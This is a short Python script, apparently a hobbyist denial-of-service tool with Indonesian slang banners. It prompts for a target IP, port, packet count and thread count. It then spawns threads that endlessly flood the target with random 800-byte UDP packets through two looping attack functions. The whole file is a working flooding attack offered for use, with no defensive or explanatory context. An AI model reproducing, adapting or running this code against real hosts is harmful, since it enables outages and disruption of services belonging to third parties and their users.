import random
import socket
import threading
import os,sys
import time

os.system('clear')
print("""\033[91m
#=======================================#
|              WARNING!!!!              |
|        RYUU NIH DEKK!!!!              |
#=======================================#""")
time.sleep(5)
os.system("clear")
print("""\033[91m████████████████████████""")
print("""\033[91m████████████████████████""")
print("""\033[91m████████████████████████""")
print("""\033[0m████████████████████████""")
print("""\033[0m████████████████████████""")
print("""\033[0m████████████████████████""")


ip = str(input("HOST/IP TARGET: "))
port = int(input("PORT TARGET: "))
times = int(input("PACKETS: "))
threads = int(input("THREADS: "))

os.system('clear')
def ddos1():
        data = random._urandom(800)
        i = random.choice(("\033[93m[@RYUU] ","\033[93m[@RYUU] ","\033[93m[@RYUU] "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\033[91mATTACK IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

def ddos2():
        data = random._urandom(800)
        i = random.choice(("\033[93m[@RYUU] ","\033[93m[@RYUU] ","\033[93m[@RYUU] "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mATTACK IP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[~] YAH KENDOS DEKKKKKG!!!")

for y in range(threads):
                th = threading.Thread(target = ddos1)
                th.start()
                th = threading.Thread(target = ddos2)
                th.start()
